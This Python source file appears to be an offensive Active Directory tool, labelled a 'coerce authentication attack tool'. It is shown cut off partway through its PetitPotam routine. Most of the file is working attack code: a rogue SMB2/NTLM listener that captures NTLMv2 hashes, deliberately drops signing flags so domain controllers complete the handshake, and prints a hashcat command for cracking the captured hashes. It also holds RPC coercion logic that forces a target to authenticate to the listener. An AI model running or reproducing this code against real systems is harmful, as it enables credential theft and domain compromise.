#!/usr/bin/env python3


import sys
import os
import signal
import logging
import traceback
import struct
import time
import socket
import ipaddress
import threading
import subprocess
from datetime import datetime
from typing import Optional, Dict, List, Tuple

# ── impacket core ────────────────────────────────────────
try:
    from impacket.dcerpc.v5 import transport
    from impacket.dcerpc.v5.rpcrt import DCERPCException
    from impacket.uuid import uuidtup_to_bin
    from impacket.dcerpc.v5.ndr import NULL
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False

# ── MS-RPRN (PrinterBug) ─────────────────────────────────
try:
    from impacket.dcerpc.v5 import rprn
    from impacket.dcerpc.v5.rprn import (
        hRpcOpenPrinter,
        hRpcRemoteFindFirstPrinterChangeNotificationEx,
        PRINTER_CHANGE_ADD_JOB,
    )
    HAS_RPRN = True
except ImportError:
    HAS_RPRN = False

# ── MS-EFSR (PetitPotam) ─────────────────────────────────
try:
    from impacket.dcerpc.v5 import efsrpc
    from impacket.dcerpc.v5.efsrpc import hEfsRpcOpenFileRaw
    HAS_EFSRPC = True
except ImportError:
    HAS_EFSRPC = False


# ═════════════════════════════════════════════════════════
#  COLOURS
# ═════════════════════════════════════════════════════════

class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    CYAN    = "\033[96m"
    MAGENTA = "\033[95m"
    BOLD    = "\033[1m"
    RESET   = "\033[0m"


def pi(msg: str) -> None:
    print(f"{C.BLUE}[*]{C.RESET} {msg}")

def po(msg: str) -> None:
    print(f"{C.GREEN}[+]{C.RESET} {msg}")

def pw(msg: str) -> None:
    print(f"{C.YELLOW}[!]{C.RESET} {msg}")

def pe(msg: str) -> None:
    print(f"{C.RED}[-]{C.RESET} {msg}")

def ph(msg: str) -> None:
    print(f"{C.MAGENTA}{C.BOLD}[HASH]{C.RESET} {msg}")


def banner() -> None:
    print(f"""
{C.CYAN}{C.BOLD}
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║       COERCE AUTHENTICATION ATTACK TOOL  v5              ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
{C.RESET}
{C.YELLOW}  
""")


def section(title: str) -> None:
    print(f"\n{C.CYAN}{'═'*56}{C.RESET}")
    print(f"{C.BOLD}  {title}{C.RESET}")
    print(f"{C.CYAN}{'═'*56}{C.RESET}\n")


def setup_logging(log_file: str) -> logging.Logger:
    """
    Configure file-based logger.
    Falls back to stderr on file permission errors so callers
    never need to guard against a None logger.
    """
    logger = logging.getLogger("coerce")
    logger.setLevel(logging.DEBUG)

    if logger.handlers:
        logger.handlers.clear()

    try:
        fh  = logging.FileHandler(log_file, encoding="utf-8")
        fh.setLevel(logging.DEBUG)
        fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
        fh.setFormatter(fmt)
        logger.addHandler(fh)
    except (OSError, PermissionError) as exc:
        pw(f"Cannot open log file '{log_file}': {exc}")
        pw("Logging to stderr instead")
        sh = logging.StreamHandler(sys.stderr)
        sh.setLevel(logging.WARNING)
        logger.addHandler(sh)

    return logger


# ═════════════════════════════════════════════════════════
#  INPUT HELPERS  —  all re-prompt on bad input
# ═════════════════════════════════════════════════════════

def ask(prompt: str, default: str = "", required: bool = True) -> str:
    """
    Prompt for a string value.
    Re-prompts if the field is required and left blank with no default.
    Never returns on KeyboardInterrupt — lets it propagate to the caller.
    """
    suffix = f" [{default}]" if default else ""
    while True:
        try:
            raw = input(f"{C.CYAN}  >{C.RESET} {prompt}{suffix}: ").strip()
        except EOFError:
            print()
            return default
        # KeyboardInterrupt propagates — caller decides whether to exit

        if raw:
            return raw
        if default:
            return default
        if not required:
            return ""
        pe("This field is required — please enter a value.")


def ask_ip(prompt: str, default: str = "") -> str:
    """
    Prompt for an IP address, re-prompting until a valid one is entered.
    Accepts an optional default shown in brackets.
    """
    suffix = f" [{default}]" if default else ""
    while True:
        try:
            raw = input(f"{C.CYAN}  >{C.RESET} {prompt}{suffix}: ").strip()
        except EOFError:
            print()
            if default:
                return default
            pe("No default available — please enter an IP address.")
            continue

        if not raw and default:
            return default

        if not raw:
            pe("IP address is required — please enter a value.")
            continue

        try:
            ipaddress.ip_address(raw)
            return raw
        except ValueError:
            pe(
                f"'{raw}' is not a valid IP address "
                f"(example: 192.168.10.20) — please try again."
            )


def ask_port(prompt: str, default: int = 445) -> int:
    """
    Prompt for a TCP port number (1-65535), re-prompting on invalid input.
    """
    while True:
        try:
            raw = input(
                f"{C.CYAN}  >{C.RESET} {prompt} [{default}]: "
            ).strip()
        except EOFError:
            print()
            return default

        if not raw:
            return default

        try:
            n = int(raw)
            if 1 <= n <= 65535:
                return n
            pe(f"Port must be between 1 and 65535 (got {n}) — please try again.")
        except ValueError:
            pe(f"'{raw}' is not a valid port number — please enter a whole number.")


def ask_bool(prompt: str, default: bool = False) -> bool:
    """
    Prompt for a yes/no answer, re-prompting on unrecognised input.
    """
    label = "Y/n" if default else "y/N"
    while True:
        try:
            raw = input(
                f"{C.CYAN}  >{C.RESET} {prompt} [{label}]: "
            ).strip().lower()
        except EOFError:
            print()
            return default

        if not raw:
            return default
        if raw in ("y", "yes"):
            return True
        if raw in ("n", "no"):
            return False
        pe("Please enter 'y' for yes or 'n' for no.")


def ask_int(prompt: str, default: int,
            min_val: int = 1, max_val: int = 65535) -> int:
    """
    Prompt for an integer within [min_val, max_val], re-prompting on error.
    """
    while True:
        try:
            raw = input(
                f"{C.CYAN}  >{C.RESET} {prompt} [{default}]: "
            ).strip()
        except EOFError:
            print()
            return default

        if not raw:
            return default

        try:
            n = int(raw)
            if min_val <= n <= max_val:
                return n
            pe(
                f"{n} is out of range — must be between "
                f"{min_val} and {max_val}.  Please try again."
            )
        except ValueError:
            pe(f"'{raw}' is not a whole number — please try again.")


def ask_choice(prompt: str, choices: List[str]) -> str:
    """
    Present a numbered menu and re-prompt until a valid choice is made.
    """
    while True:
        for i, c in enumerate(choices, 1):
            print(f"    {C.CYAN}{i}{C.RESET}. {c}")
        try:
            raw = input(f"{C.CYAN}  >{C.RESET} {prompt}: ").strip()
        except EOFError:
            print()
            return choices[0]

        if raw.isdigit():
            idx = int(raw)
            if 1 <= idx <= len(choices):
                return choices[idx - 1]

        pe(
            f"'{raw}' is not a valid choice — "
            f"please enter a number between 1 and {len(choices)}."
        )


def ask_filename(prompt: str, default: str) -> str:
    """
    Prompt for a filename, re-prompting if the directory is not writable.
    Accepts the default on blank input.
    """
    while True:
        try:
            raw = input(
                f"{C.CYAN}  >{C.RESET} {prompt} [{default}]: "
            ).strip()
        except EOFError:
            print()
            return default

        name = raw if raw else default

        # Check the target directory is writable
        directory = os.path.dirname(os.path.abspath(name))
        if not os.path.isdir(directory):
            pe(
                f"Directory '{directory}' does not exist — "
                f"please enter a different path."
            )
            continue
        if not os.access(directory, os.W_OK):
            pe(
                f"Directory '{directory}' is not writable — "
                f"please enter a different path."
            )
            continue

        return name


# ═════════════════════════════════════════════════════════
#  SMB2 / NTLM PROTOCOL CONSTANTS
# ═════════════════════════════════════════════════════════

# Core NTLM flags — signing/sealing bits deliberately omitted.
# NEGOTIATE_SIGN (0x10), NEGOTIATE_SEAL (0x20), NEGOTIATE_ALWAYS_SIGN
# (0x8000) tell the DC all messages must be signed; since our listener
# cannot produce valid MACs the DC aborts immediately if they are set.
NTLM_FLAGS = (
    0x00000001 |  # NEGOTIATE_UNICODE
    0x00000004 |  # REQUEST_TARGET
    0x00000200 |  # NEGOTIATE_NTLM
    0x00010000 |  # TARGET_TYPE_DOMAIN
    0x00020000 |  # NEGOTIATE_EXTENDED_SESSIONSECURITY (NTLMv2)
    0x00800000 |  # NEGOTIATE_TARGET_INFO
    0x02000000 |  # NEGOTIATE_VERSION
    0x20000000 |  # NEGOTIATE_128
    0x40000000 |  # NEGOTIATE_KEY_EXCH
    0x80000000    # NEGOTIATE_56
)

NTLMSSP_SIG = b"NTLMSSP\x00"
WIN_VER     = struct.pack("<BBHBBBB", 10, 0, 17763, 0, 0, 0, 15)
OID_SPNEGO  = bytes([0x2b, 0x06, 0x01, 0x05, 0x05, 0x02])
OID_NTLMSSP = bytes([0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37,
                     0x02, 0x02, 0x0a])
SERVER_GUID = bytes.fromhex("6ba7b8109dad11d180b400c04fd430c8")


# ═════════════════════════════════════════════════════════
#  ASN.1 / SPNEGO HELPERS
# ═════════════════════════════════════════════════════════

def _asn1_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    if n < 0x100:
        return bytes([0x81, n])
    if n < 0x10000:
        return bytes([0x82, n >> 8, n & 0xFF])
    return bytes([0x83, n >> 16, (n >> 8) & 0xFF, n & 0xFF])


def _asn1(tag: int, data: bytes) -> bytes:
    return bytes([tag]) + _asn1_len(len(data)) + data


def _seq(data: bytes)      -> bytes: return _asn1(0x30, data)
def _ctx(n: int, d: bytes) -> bytes: return _asn1(0xa0 + n, d)
def _oid(data: bytes)      -> bytes: return _asn1(0x06, data)
def _oct(data: bytes)      -> bytes: return _asn1(0x04, data)
def _app(data: bytes)      -> bytes: return _asn1(0x60, data)
def _enum(v: int)          -> bytes: return _asn1(0x0a, bytes([v]))


def build_spnego_negotiate() -> bytes:
    mech_list = _seq(_oid(OID_NTLMSSP))
    neg_token = _seq(_ctx(0, mech_list))
    return _app(_oid(OID_SPNEGO) + _ctx(0, neg_token))


def build_spnego_challenge(ntlmssp_blob: bytes) -> bytes:
    inner = (
        _ctx(0, _enum(1)) +
        _ctx(1, _oid(OID_NTLMSSP)) +
        _ctx(2, _oct(ntlmssp_blob))
    )
    return _asn1(0xa1, _seq(inner))


# ═════════════════════════════════════════════════════════
#  NTLMSSP CHALLENGE BUILDER
# ═════════════════════════════════════════════════════════

def build_ntlmssp_challenge(challenge: bytes, domain: str) -> bytes:
    """
    Build an NTLMSSP Type 2 (Challenge) message.

    Domain name handling:
      FQDN  ("cs.org") → NetBIOS="CS",    DNS domain="cs.org"
      Flat  ("CS")     → NetBIOS="CS",    DNS domain="cs.local"
    The DC validates AvPair names against its own identity; incorrect
    values cause it to disconnect before sending the Type 3 response.
    """
    domain_lower = domain.strip().lower()
    if "." in domain_lower:
        nb_name  = domain_lower.split(".")[0].upper()
        dns_name = domain_lower
    else:
        nb_name  = domain_lower.upper()
        dns_name = domain_lower + ".local"

    nb_domain  = nb_name.encode("utf-16-le")
    nb_server  = b"D\x00C\x00"
    dns_domain = dns_name.encode("utf-16-le")
    dns_server = ("dc." + dns_name).encode("utf-16-le")

    av  = struct.pack("<HH", 2, len(nb_domain))  + nb_domain
    av += struct.pack("<HH", 1, len(nb_server))  + nb_server
    av += struct.pack("<HH", 4, len(dns_domain)) + dns_domain
    av += struct.pack("<HH", 3, len(dns_server)) + dns_server
    av += struct.pack("<HH", 0, 0)

    tn_offset = 56
    av_offset = tn_offset + len(nb_domain)

    msg  = NTLMSSP_SIG
    msg += struct.pack("<I", 2)
    msg += struct.pack("<HHI", len(nb_domain), len(nb_domain), tn_offset)
    msg += struct.pack("<I", NTLM_FLAGS)
    msg += challenge
    msg += b"\x00" * 8
    msg += struct.pack("<HHI", len(av), len(av), av_offset)
    msg += WIN_VER
    msg += nb_domain
    msg += av
    return msg


# ═════════════════════════════════════════════════════════
#  NTLMSSP TYPE 3 PARSER
# ═════════════════════════════════════════════════════════

def parse_ntlmssp_auth(data: bytes, challenge: bytes,
                       peer: str,
                       logger: logging.Logger) -> Optional[str]:
    """
    Parse an NTLMv2 Type 3 (Authenticate) message from a raw SMB2 packet.

    Searches the entire buffer for NTLMSSP\x00 rather than assuming a
    fixed offset — required because the DC's SMB client stack wraps the
    NTLMSSP blob in an additional SPNEGO layer on retry connections,
    pushing the signature well past the 88-byte SMB2 fixed-header mark.
    """
    if not data:
        logger.debug(f"[{peer}] parse_ntlmssp_auth: empty data")
        return None

    idx = data.find(NTLMSSP_SIG)
    if idx == -1:
        logger.debug(
            f"[{peer}] NTLMSSP signature not found in {len(data)}B. "
            f"First 32B: {data[:32].hex()}"
        )
        return None

    msg = data[idx:]
    if len(msg) < 12:
        logger.debug(f"[{peer}] NTLMSSP blob too short: {len(msg)}B")
        return None

    try:
        msg_type = struct.unpack("<I", msg[8:12])[0]
    except struct.error as exc:
        logger.debug(f"[{peer}] Cannot read NTLMSSP message type: {exc}")
        return None

    if msg_type != 3:
        logger.debug(f"[{peer}] NTLMSSP type={msg_type}, expected 3")
        return None

    def read_field(off: int) -> bytes:
        if off + 8 > len(msg):
            return b""
        try:
            length, _max, buf_off = struct.unpack("<HHI", msg[off:off + 8])
        except struct.error:
            return b""
        if length == 0 or buf_off + length > len(msg):
            return b""
        return msg[buf_off:buf_off + length]

    nt_response = read_field(20)
    domain_raw  = read_field(28)
    user_raw    = read_field(36)

    if len(nt_response) < 24:
        logger.debug(
            f"[{peer}] NT response too short: {len(nt_response)}B"
        )
        return None

    try:
        domain = domain_raw.decode("utf-16-le", errors="replace").strip("\x00")
        user   = user_raw.decode("utf-16-le",   errors="replace").strip("\x00")
    except Exception as exc:
        logger.debug(f"[{peer}] Decode error: {exc}")
        domain = user = "UNKNOWN"

    if not user:
        logger.debug(f"[{peer}] Empty username in Type 3 — skipping")
        return None

    nt_proof = nt_response[:16]
    blob     = nt_response[16:]

    hash_str = (
        f"{user}::{domain}:"
        f"{challenge.hex()}:"
        f"{nt_proof.hex()}:"
        f"{blob.hex()}"
    )
    logger.debug(f"[{peer}] Parsed NTLMv2 for {user}@{domain}")
    return hash_str


# ═════════════════════════════════════════════════════════
#  SMB2 FRAME BUILDERS
# ═════════════════════════════════════════════════════════

def smb2_header(command: int, status: int = 0,
                flags: int = 0x00000001,
                mid: int = 0, sid: int = 0, tid: int = 0,
                credits: int = 32) -> bytes:
    return (
        b"\xfeSMB"
        + struct.pack("<H", 64)
        + struct.pack("<H", 0)
        + struct.pack("<I", status)
        + struct.pack("<H", command)
        + struct.pack("<H", credits)
        + struct.pack("<I", flags)
        + struct.pack("<I", 0)
        + struct.pack("<Q", mid)
        + struct.pack("<I", 0)
        + struct.pack("<I", tid)
        + struct.pack("<Q", sid)
        + b"\x00" * 16
    )


def build_negotiate_response(dialect: int,
                             spnego_blob: bytes,
                             mid: int) -> bytes:
    now  = (int(time.time()) + 11644473600) * 10_000_000
    body = (
        struct.pack("<H", 65)
        + struct.pack("<H", 0x0001)
        + struct.pack("<H", dialect)
        + struct.pack("<H", 0)
        + SERVER_GUID
        + struct.pack("<I", 0x0000007F)
        + struct.pack("<I", 0x00800000)
        + struct.pack("<I", 0x00800000)
        + struct.pack("<I", 0x00800000)
        + struct.pack("<Q", now)
        + struct.pack("<Q", 0)
        + struct.pack("<H", 128)
        + struct.pack("<H", len(spnego_blob))
        + struct.pack("<I", 0)
    )
    assert len(body) == 64
    return smb2_header(0x0000, mid=mid, credits=32) + body + spnego_blob


def build_session_setup_response(mid: int, sid: int,
                                 spnego_blob: bytes,
                                 status: int = 0xC0000016) -> bytes:
    sec_buf_offset = 64 + 8
    body = (
        struct.pack("<H", 9)
        + struct.pack("<H", 0)
        + struct.pack("<H", sec_buf_offset)
        + struct.pack("<H", len(spnego_blob))
    )
    assert len(body) == 8
    return (
        smb2_header(0x0001, status=status, mid=mid, sid=sid, credits=32)
        + body
        + spnego_blob
    )


# ═════════════════════════════════════════════════════════
#  NETBIOS-FRAMED SEND / RECV
# ═════════════════════════════════════════════════════════

def _recv_exact(conn: socket.socket, n: int) -> Optional[bytes]:
    buf = b""
    while len(buf) < n:
        try:
            chunk = conn.recv(n - len(buf))
        except (socket.timeout, ConnectionResetError, OSError):
            return None
        if not chunk:
            return None
        buf += chunk
    return buf


def nb_recv(conn: socket.socket,
            logger: logging.Logger,
            peer: str) -> Optional[bytes]:
    hdr = _recv_exact(conn, 4)
    if not hdr:
        return None
    length = struct.unpack(">I", hdr)[0] & 0x00FFFFFF
    if length == 0:
        return b""
    data = _recv_exact(conn, length)
    if data is None:
        return None
    if len(data) >= 14:
        try:
            cmd = struct.unpack("<H", data[12:14])[0]
            logger.debug(f"[{peer}] RECV {len(data)}B cmd=0x{cmd:04x}")
        except struct.error:
            logger.debug(f"[{peer}] RECV {len(data)}B (cmd parse err)")
    else:
        logger.debug(f"[{peer}] RECV {len(data)}B (short)")
    return data


def nb_send(conn: socket.socket, data: bytes,
            logger: logging.Logger, peer: str) -> bool:
    try:
        conn.sendall(struct.pack(">I", len(data)) + data)
    except (OSError, BrokenPipeError, ConnectionResetError) as exc:
        logger.debug(f"[{peer}] SEND failed: {exc}")
        return False
    if len(data) >= 14:
        try:
            cmd = struct.unpack("<H", data[12:14])[0]
            logger.debug(f"[{peer}] SENT {len(data)}B cmd=0x{cmd:04x}")
        except struct.error:
            logger.debug(f"[{peer}] SENT {len(data)}B (cmd parse err)")
    else:
        logger.debug(f"[{peer}] SENT {len(data)}B (short)")
    return True


# ═════════════════════════════════════════════════════════
#  SMB2 HEADER FIELD HELPERS
# ═════════════════════════════════════════════════════════

def parse_mid(raw: bytes) -> int:
    if len(raw) < 32:
        return 0
    try:
        return struct.unpack("<Q", raw[24:32])[0]
    except struct.error:
        return 0


def parse_dialect(raw: bytes) -> int:
    try:
        if len(raw) < 70:
            return 0x0202
        count = struct.unpack("<H", raw[66:68])[0]
        if count == 0 or count > 64:
            return 0x0202
        dialects = []
        for i in range(count):
            off = 100 + i * 2
            if off + 2 > len(raw):
                break
            dialects.append(struct.unpack("<H", raw[off:off + 2])[0])
        for prefer in [0x0202, 0x0210, 0x0300, 0x0302, 0x0311]:
            if prefer in dialects:
                return prefer
        return dialects[0] if dialects else 0x0202
    except (struct.error, IndexError):
        return 0x0202


# ═════════════════════════════════════════════════════════
#  HASH RECORDING
# ═════════════════════════════════════════════════════════

def _record_hash(hash_str: str, peer: str,
                 captures: List[Dict],
                 lock: threading.Lock,
                 logger: logging.Logger) -> None:
    """
    Store a captured NTLMv2 hash and print it.
    Deduplication is by (username, domain) — the DC fires multiple retry
    connections after coercion; each has a unique challenge so each hash
    string is different even though they all represent the same account.
    """
    try:
        parts    = hash_str.split("::")
        username = parts[0].strip() if parts else "UNKNOWN"
        dom_part = parts[1] if len(parts) > 1 else ""
        domain   = (
            dom_part.split(":")[0].strip()
            if ":" in dom_part else dom_part.strip()
        )
        username = username or "UNKNOWN"
        domain   = domain   or "UNKNOWN"
    except Exception as exc:
        logger.debug(f"[{peer}] _record_hash parse error: {exc}")
        username = domain = "UNKNOWN"

    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with lock:
        for existing in captures:
            try:
                ep = existing["hash"].split("::")
                eu = ep[0].strip() if ep else ""
                ed = ep[1].split(":")[0].strip() if len(ep) > 1 else ""
            except Exception:
                eu = ed = ""
            if eu == username and ed == domain:
                logger.debug(
                    f"[{peer}] Duplicate {username}@{domain} — skipped"
                )
                return
        captures.append({
            "timestamp": ts,
            "source_ip": peer,
            "protocol":  "SMBv2",
            "hash":      hash_str,
        })

    print()
    print(f"{C.MAGENTA}{C.BOLD}{'═'*62}{C.RESET}")
    ph(f"  NTLMv2 CAPTURED from {peer}")
    print(f"{C.MAGENTA}{'─'*62}{C.RESET}")
    print(f"  {C.BOLD}Time   :{C.RESET} {ts}")
    print(f"  {C.BOLD}Source :{C.RESET} {peer}")
    print(f"  {C.BOLD}Account:{C.RESET} {username}@{domain}")
    print(f"  {C.BOLD}Hash   :{C.RESET}")
    print(f"  {C.YELLOW}{hash_str}{C.RESET}")
    print(f"{C.MAGENTA}{'─'*62}{C.RESET}")
    print(f"  {C.CYAN}hashcat -m 5600 hash.txt rockyou.txt --force{C.RESET}")
    print(f"{C.MAGENTA}{C.BOLD}{'═'*62}{C.RESET}")
    print()
    logger.info(f"HASH CAPTURED: {username}@{domain} from {peer}")
    logger.info(f"HASH: {hash_str}")


# ═════════════════════════════════════════════════════════
#  NTLM SESSION SETUP EXCHANGE
# ═════════════════════════════════════════════════════════

def _do_session_setup(conn: socket.socket, peer: str,
                      captures: List[Dict],
                      lock: threading.Lock,
                      logger: logging.Logger,
                      domain: str,
                      our_sid: int) -> None:
    """
    Shared NTLM two-round handshake (Type 1 → Type 2 → Type 3).
    Called from both the SMB2 path and the SMB1-upgrade path.
    """
    # Round 1 — receive NTLM Negotiate (Type 1)
    raw1 = nb_recv(conn, logger, peer)
    if not raw1:
        logger.debug(f"[{peer}] No Session Setup #1 received")
        return

    mid1 = parse_mid(raw1)

    try:
        if len(raw1) >= 78:
            sec_off = struct.unpack("<H", raw1[76:78])[0]
        else:
            sec_off = 88
        logger.debug(
            f"[{peer}] SS#1 secbuf[{sec_off}:+16]: "
            f"{raw1[sec_off:sec_off + 16].hex()}"
        )
    except Exception:
        pass

    challenge   = os.urandom(8)
    ntlm_blob   = build_ntlmssp_challenge(challenge, domain)
    spnego_blob = build_spnego_challenge(ntlm_blob)

    if not nb_send(
        conn,
        build_session_setup_response(mid1, our_sid, spnego_blob, 0xC0000016),
        logger, peer,
    ):
        logger.debug(f"[{peer}] Failed to send NTLM challenge")
        return

    logger.debug(f"[{peer}] Sent NTLM challenge {challenge.hex()}")

    # Round 2 — receive NTLM Authenticate (Type 3)
    raw2 = nb_recv(conn, logger, peer)
    if not raw2:
        logger.debug(
            f"[{peer}] No Session Setup #2 — DC dropped after Type 2"
        )
        return

    mid2     = parse_mid(raw2)
    hash_str = parse_ntlmssp_auth(raw2, challenge, peer, logger)

    if hash_str:
        nb_send(
            conn,
            build_session_setup_response(mid2, our_sid, b"", 0x00000000),
            logger, peer,
        )
        _record_hash(hash_str, peer, captures, lock, logger)
    else:
        logger.debug(
            f"[{peer}] Could not parse NTLMv2 from SS#2 "
            f"({len(raw2)}B). First 128B: {raw2[:128].hex()}"
        )


# ═════════════════════════════════════════════════════════
#  PER-CONNECTION HANDLERS
# ═════════════════════════════════════════════════════════

def handle_smb2_session(conn: socket.socket, neg_raw: bytes,
                        peer: str,
                        captures: List[Dict],
                        lock: threading.Lock,
                        logger: logging.Logger,
                        domain: str = "CS") -> None:
    dialect = parse_dialect(neg_raw)
    mid0    = parse_mid(neg_raw)
    logger.debug(f"[{peer}] SMB2 Negotiate dialect=0x{dialect:04x}")

    if not nb_send(
        conn,
        build_negotiate_response(dialect, build_spnego_negotiate(), mid0),
        logger, peer,
    ):
        logger.debug(f"[{peer}] Failed to send SMB2 Negotiate Response")
        return

    _do_session_setup(conn, peer, captures, lock, logger, domain,
                      our_sid=0x4100000000000001)


def handle_smb1_upgrade(conn: socket.socket, peer: str,
                        captures: List[Dict],
                        lock: threading.Lock,
                        logger: logging.Logger,
                        domain: str = "CS") -> None:
    """
    SMB1 upgrade: reply with a full SMB2 Negotiate Response (Responder-style).
    The DC's next packet is then Session Setup #1, NOT another Negotiate.
    """
    logger.debug(
        f"[{peer}] SMB1 Negotiate → replying with SMB2 Negotiate Response"
    )
    if not nb_send(
        conn,
        build_negotiate_response(0x0202, build_spnego_negotiate(), mid=0),
        logger, peer,
    ):
        logger.debug(f"[{peer}] Failed to send SMB2 NegResp (SMB1 path)")
        return

    _do_session_setup(conn, peer, captures, lock, logger, domain,
                      our_sid=0x4100000000000001)


def handle_client(conn: socket.socket,
                  addr: Tuple[str, int],
                  captures: List[Dict],
                  lock: threading.Lock,
                  logger: logging.Logger,
                  domain: str) -> None:
    peer = addr[0]
    try:
        conn.settimeout(30)
        raw = nb_recv(conn, logger, peer)
        if not raw:
            logger.debug(f"[{peer}] Empty first packet")
            return
        proto = raw[:4]
        if proto == b"\xffSMB":
            handle_smb1_upgrade(conn, peer, captures, lock, logger, domain)
        elif proto == b"\xfeSMB":
            handle_smb2_session(conn, raw, peer, captures, lock, logger, domain)
        else:
            logger.debug(
                f"[{peer}] Unknown protocol: {proto.hex()} "
                f"— first 32B: {raw[:32].hex()}"
            )
    except socket.timeout:
        logger.debug(f"[{peer}] Timed out during handshake")
    except ConnectionResetError:
        logger.debug(f"[{peer}] Connection reset by peer")
    except OSError as exc:
        logger.debug(f"[{peer}] Socket error: {exc}")
    except Exception as exc:
        logger.debug(
            f"[{peer}] Unexpected: {exc}\n{traceback.format_exc()}"
        )
    finally:
        try:
            conn.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            conn.close()
        except OSError:
            pass


# ═════════════════════════════════════════════════════════
#  SMB LISTENER
# ═════════════════════════════════════════════════════════

class SMBListener:
    def __init__(self, ip: str, port: int,
                 logger: logging.Logger,
                 domain: str = "CS") -> None:
        self.ip       = ip
        self.port     = port
        self.logger   = logger
        self.domain   = domain
        self.captures: List[Dict] = []
        self._lock    = threading.Lock()
        self._stop    = threading.Event()
        self._sock:   Optional[socket.socket]    = None
        self._thread: Optional[threading.Thread] = None

    def start(self) -> bool:
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            self._sock.bind((self.ip, self.port))
            self._sock.listen(64)
            self._sock.settimeout(1.0)
        except PermissionError:
            pe(f"Permission denied binding port {self.port} — run as root")
            return False
        except OSError as exc:
            pe(f"Cannot bind {self.ip}:{self.port} — {exc}")
            return False

        self._thread = threading.Thread(
            target=self._accept_loop,
            daemon=True,
            name="SMBListener-accept",
        )
        self._thread.start()
        po(f"SMB2 listener bound to {self.ip}:{self.port}")
        self.logger.info(f"Listener started on {self.ip}:{self.port}")
        return True

    def stop(self) -> None:
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=5)

    def get_captures(self) -> List[Dict]:
        with self._lock:
            return list(self.captures)

    def _accept_loop(self) -> None:
        while not self._stop.is_set():
            try:
                conn, addr = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            pi(f"Connection from {addr[0]}:{addr[1]}")
            self.logger.info(f"Connection from {addr[0]}:{addr[1]}")
            threading.Thread(
                target=handle_client,
                args=(conn, addr, self.captures, self._lock,
                      self.logger, self.domain),
                daemon=True,
                name=f"SMBClient-{addr[0]}-{addr[1]}",
            ).start()


# ═════════════════════════════════════════════════════════
#  RPC HELPERS
# ═════════════════════════════════════════════════════════

EFSR_UUID  = ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0")
RPRN_UUID  = ("12345678-1234-abcd-ef00-0123456789ab", "1.0")
DFSNM_UUID = ("4fc742e0-4a10-11cf-8273-00aa004ae673", "3.0")
FSRVP_UUID = ("a8e0653c-2744-4389-a61d-7373df8b2292", "1.0")


def _connect_dce(target: str, pipe: str,
                 user: str, pwd: str, dom: str, anon: bool):
    sb  = f"ncacn_np:{target}[{pipe}]"
    rpc = transport.DCERPCTransportFactory(sb)
    rpc.set_connect_timeout(10)
    if anon or not user:
        rpc.set_credentials("", "", "", "", "", None)
    else:
        rpc.set_credentials(user, pwd, dom, "", "", None)
    dce = rpc.get_dce_rpc()
    dce.set_credentials(*rpc.get_credentials())
    dce.connect()
    return dce


def _safe_disconnect(dce, logger: logging.Logger, ctx: str) -> None:
    try:
        dce.disconnect()
    except Exception as exc:
        logger.debug(f"DCE disconnect ({ctx}): {exc}")


def friendly_error(exc: Exception) -> str:
    s = str(exc)
    table = {
        "STATUS_ACCESS_DENIED":          "Access denied",
        "STATUS_LOGON_FAILURE":          "Bad credentials",
        "STATUS_NO_SUCH_FILE":           "Pipe not found",
        "STATUS_OBJECT_NAME_NOT_FOUND":  "Pipe not found",
        "STATUS_PIPE_NOT_AVAILABLE":     "Pipe not available",
        "abstract_syntax_not_supported": "Interface not supported",
        "0xc0000022":                    "Access denied",
        "0xc000006d":                    "Bad credentials",
        "0x8":                           "Auth type not recognized",
        "timed out":                     "Timed out",
        "rpc_s_procnum_out_of_range":    "Opnum rejected (patched?)",
        "nca_s_proto_error":             "Protocol error (NDR rejected)",
        "rpc_s_server_unavailable":      "RPC unavailable (callback fired)",
        "0x6ba":                         "RPC unavailable (callback fired)",
    }
    sl = s.lower()
    for k, v in table.items():
        if k.lower() in sl:
            return v
    return s[:120]


def _is_expected_rpc_error(exc: Exception) -> bool:
    s = str(exc).lower()
    return any(t in s for t in [
        "rpc_s_server_unavailable", "0x6ba",
        "rpc_s_server_too_busy",    "0x6bf",
        "error_invalid_handle",     "0x6",
        "access_denied",            "0x5",
        "bad_netpath",              "0x35",
        "error_bad_netpath",
    ])


def _ndr_wstr(text: str) -> bytes:
    enc = (text + "\x00").encode("utf-16-le")
    n   = len(enc) // 2
    return struct.pack("<III", n, 0, n) + enc


def _ndr_ptr(data: bytes) -> bytes:
    return struct.pack("<I", 0x00020000) + data


# ═════════════════════════════════════════════════════════
#  COERCION: PETITPOTAM (MS-EFSR)
# ═════════════════════════════════════════════════════════

def coerce_petitpotam(target: str, listener: str,
                      user: str, pwd: str, dom: str,
                      anon: bool,
                      log: logging.Logger) -> bool:
    section("PetitPotam  (MS-EFSR)")
    pi(f"Target   : {target}")
    pi(f"Listener : {listener}")
    pi(f"Auth     : {'anonymous' if (anon and not user) else f'{user}@{dom}'}")

    if not HAS_EFSRPC:
        pw("impacket efsrpc not found — falling back to raw NDR")
        return _coerce_petitpotam_raw(
            target, listener, user, pwd, dom, anon, log
        )

    unc = f"\\\\{listener}\\share\\x"
    pipes: List[Tuple[str, bool]] = []
    if anon:
        pipes += [
            (r"\pipe\lsarpc",   True),
            (r"\pipe\efsrpc",   True),
            (r"\pipe\samr",     True),
            (r"\pipe\netlogon", True),
        ]
    if user:
        pipes += [
            (r"\pipe\lsarpc",   False),
            (r"\pipe\efsrpc",   False),
            (r"\pipe\samr",     False),
            (r"\pipe\netlogon", False),
        ]
    if not pipes:
        pe("PetitPotam: no credentials and anonymous disabled — skipping")
        return False

